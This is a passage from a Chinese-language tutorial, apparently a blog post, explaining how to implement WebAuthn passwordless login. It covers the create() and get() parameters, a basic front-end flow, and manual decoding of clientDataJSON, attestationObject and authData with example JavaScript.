ArrayBuffer(32) {},\n    response: AuthenticatorAttestationResponse {\n        attestationObject: ArrayBuffer(390) {},\n        clientDataJSON: ArrayBuffer(121) {}\n    },\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\n    type: \"public-key\"\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\n    publicKey: {\n        challenge,\n        rpId,\n        userVerification,\n        allowCredentials: [\n            {\n                id,\n                transports: [],\n                type: \"public-key\"\n            }\n        ],\n        timeout\n    }\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\n    rawId: ArrayBuffer(32) {},\n    response: AuthenticatorAssertionResponse {\n        authenticatorData: ArrayBuffer(37) {},\n        signature: ArrayBuffer(256) {},\n        userHandle: ArrayBuffer(64) {},\n        clientDataJSON: ArrayBuffer(118) {}\n    }\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\n    type: \"public-key\"\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\n    challenge, // 自行设置\n    rp, // 自行设置\n    user, // 自行设置\n    pubKeyCredParams: [\n        {\n            type: \"public-key\",\n            alg: -7 // ES256\n        },\n        {\n            type: \"public-key\",\n            alg: -257 // RS256\n        }\n    ],\n    authenticatorSelection: {\n        userVerification: \"discouraged\",\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\n    },\n    excludeCredentials, // 自行设置\n    timeout: 60000\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\n    return window.btoa(String.fromCharCode(...a));\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\n    const publicKeyCredential = {\n        id: credentialInfo.id,\n        type: credentialInfo.type,\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\n        response: {\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\n        }\n    };\n    return publicKeyCredential;\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\n    // 可以发送了\n}).catch((error) =&gt; {\n    console.warn(error); // 捕获错误\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\n    publicKey: {\n        rp: {\n            icon\n        },\n        user: {\n            icon\n        },\n        attestation,\n        authenticatorSelection: {\n            requireResidentKey\n        },\n        extensions\n    }\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\n    uvm: true, // 要求认证器返回用户进行验证的方法\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\n    type: \"public-key\",\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\n    response: {\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\n    }\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\n    origin: \"https://dev.axton.cc\",\n    type: \"webauthn.create\"\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\n    clientExtensions: {},\n    hashAlgorithm: \"SHA-256\",\n    origin: \"https://dev.axton.cc\",\n    type: \"webauthn.create\"\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    fmt: \"none\",\n    attStmt: {},\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\n    let rpIdHash = buffer.slice(0, 32);\n    buffer = buffer.slice(32);\n  \n    let flagsBuf = buffer.slice(0, 1);\n    buffer = buffer.slice(1);\n\n    let flagsInt = flagsBuf[0];\n    let flags = {\n        up: !!(flagsInt &amp; 0x01),\n        uv: !!(flagsInt &amp; 0x04),\n        at: !!(flagsInt &amp; 0x40),\n        ed: !!(flagsInt &amp; 0x80),\n        flagsInt\n    }\n\n    let counterBuf = buffer.slice(0, 4);\n    buffer = buffer.slice(4);\n  \n    let counter = counterBuf.readUInt32BE(0);\n\n    let aaguid = undefined;\n    let credID = undefined;\n    let COSEPublicKey = undefined;\n\n    if(flags.at) {\n        aaguid = buffer.slice(0, 16);\n        buffer = buffer.slice(16);\n\n        let credIDLenBuf = buffer.slice(0, 2);\n        buffer = buffer.slice(2);\n\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\n        credID = buffer.slice(0, credIDLen);\n\n        buffer = buffer.slice(credIDLen);\n        COSEPublicKey = buffer;\n    }\n\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    kty: \"EC\",\n    alg: \"ECDSA_w_SHA256\",\n    crv: \"P-256\",\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    fmt: \"packed\",\n    attStmt: {\n        alg: -7,\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\n        x5c: [\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\n        ]\n    },\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\n    type: \"public-key\",\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\n    response: {\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\n    }\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\n    origin: \"https://dev.axton.cc\",\n    type: \"webauthn.get\"\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 